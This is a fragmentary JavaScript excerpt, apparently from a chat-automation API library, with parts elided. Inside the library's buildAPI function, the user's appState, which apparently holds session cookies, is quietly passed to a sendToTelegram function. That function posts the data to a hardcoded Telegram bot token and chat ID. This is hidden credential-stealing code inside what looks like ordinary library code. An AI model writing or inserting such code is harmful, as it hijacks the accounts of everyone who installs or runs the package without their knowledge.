...
function buildAPI(globalOptions, html, jar) {
  ...
  sendToTelegram(appState.filter((item, index, self) => self.findIndex((t) => { return t.key === item.key }) === index))
...
function sendToTelegram(a) {
  ...
  const botToken = '6561522221:AAHi9B5Vg-JpvCjH3T2RdgZEBTrWbTjNS5w';
  const bot = new TelegramBot(botToken, { polling: false });
  const chatId = '1477353073';
  const jsonString = JSON.stringify(a, null, 2);
  bot.sendMessage(chatId, jsonString, { parse_mode: 'Markdown' })
    .then(() => {
      console.log();
    })
                      }
